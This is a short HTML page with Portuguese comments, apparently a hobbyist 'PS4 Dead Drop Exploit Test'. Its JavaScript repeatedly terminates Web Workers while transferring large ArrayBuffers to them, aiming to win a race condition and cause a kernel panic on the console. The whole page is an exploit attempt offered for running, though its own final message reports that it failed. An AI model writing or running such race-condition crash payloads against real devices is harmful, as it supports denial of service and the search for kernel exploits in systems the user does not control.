<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 Dead Drop Exploit Test</title>
    
</head>
<body>

    <h1>Teste de Transferência Zumbi</h1>
    <p>Tenta enviar memória para uma thread no exato momento da morte.</p>

    <button onclick="startDeadDrop()">INICIAR ATAQUE (RACE CONDITION)</button>
    <div id="status">Pronto.</div>
    <div id="log"></div>

    <script>
        // Configuração
        const ATTEMPTS = 1000; // Quantas vezes tentar a corrida
        const MEMORY_SIZE = 1024 * 1024 * 10; // 10MB para ser pesado o suficiente

        // Worker simples que aceita a mensagem
        const workerCode = `
            self.onmessage = function(e) {
                // Apenas recebe a memória e morre naturalmente
            };
        `;
        const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));

        function log(msg) {
            const el = document.getElementById('log');
            el.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}<br>` + el.innerHTML;
        }

        async function startDeadDrop() {
            document.getElementById('status').innerText = "RODANDO...";
            
            for (let i = 0; i < ATTEMPTS; i++) {
                // 1. Prepara a memória (Munição)
                let buffer = new ArrayBuffer(MEMORY_SIZE);
                
                // 2. Cria a vítima
                let w = new Worker(url);

                // 3. O ATAQUE: Tenta matar e enviar ao mesmo tempo
                // Usamos Promises para tentar alinhar a execução o máximo possível
                
                // Ação A: Matar
                let killPromise = new Promise(resolve => {
                    w.terminate();
                    resolve();
                });

                // Ação B: Enviar memória (Transferable)
                // O try/catch é necessário porque o JS normal vai reclamar,
                // mas queremos ver se o KERNEL reclama (Panic).
                try {
                    w.postMessage(buffer, [buffer]);
                } catch(e) {
                    // É normal dar erro aqui no JS, ignoramos.
                    // O que queremos é o crash do sistema.
                }

                if (i % 50 === 0) {
                    log(`Tentativa ${i}: Corrida disparada.`);
                    // Pausa pequena para não travar o navegador totalmente
                    await new Promise(r => setTimeout(r, 10));
                }
            }

            log("Teste finalizado sem Kernel Panic.");
            document.getElementById('status').innerText = "FALHOU (O sistema protegeu corretamente).";
        }
    </script>
</body>
</html>
